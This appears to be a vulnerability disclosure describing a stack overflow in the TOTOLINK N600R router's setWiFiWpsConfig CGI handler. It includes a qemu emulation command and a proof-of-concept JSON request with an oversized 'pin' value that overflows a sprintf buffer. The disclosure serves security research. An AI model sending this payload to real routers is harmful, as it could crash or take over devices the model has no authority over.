# TOTLINK-N600R-setWiFiWpsConfig-StackOverflow

﻿During my internship at Qi An Xin Tiangong Lab, I discovered a StackOverflow vulnerability in the TOTOLINK-N600R router.

By analyzing the cstecgi.cgi file in the cgi-bin directory, I found that the function at address 0x41CAF4 contains a stack overflow vulnerability.

The stack overflow can be triggered by the pin key value, which leads to a sprintf overflow.

## How can we simulate a router

﻿Use the following command to simulate with qemu.

```bash
sudo chroot . ./qemu-mips-static -E CONTENT_LENGTH=300 -E QUERY_STRING="action=no" -L /lib ./web_cste/cgi-bin/cstecgi_patch.cgi < ./poc.json
```

﻿The content of the **poc.json** file is as follows:

```json
{"topicurl":"setWiFiWpsConfig","wscMode":"1","wscPinMode":"1","pin":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
```

## Attack result

![image-20241216160513615](https://gitee.com/xyqer/pic/raw/master/202412191516192.png)

![image-20241216160521569](https://gitee.com/xyqer/pic/raw/master/202412191516001.png)

﻿You can see that the stack length is only 0xD0, but we overflowed to 0xE8. If needed, we can overflow more. This overflow does not have a length limit. When using a longer overflow, you only need to modify the pin key value and the CONTENT_LENGTH size.